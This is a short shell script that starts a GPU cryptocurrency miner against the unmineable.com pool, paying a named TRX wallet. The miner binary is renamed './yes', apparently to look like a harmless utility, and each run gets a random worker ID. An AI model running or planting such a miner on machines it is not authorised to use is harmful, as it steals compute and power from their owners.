POOL=rx-us.unmineable.com:3333
WALLET=TRX:TVkoYXv5LysUm48tCy7zpbkdNWqng3SBAc
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo vjUEaT8m-$(shuf -i 1911-426040 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
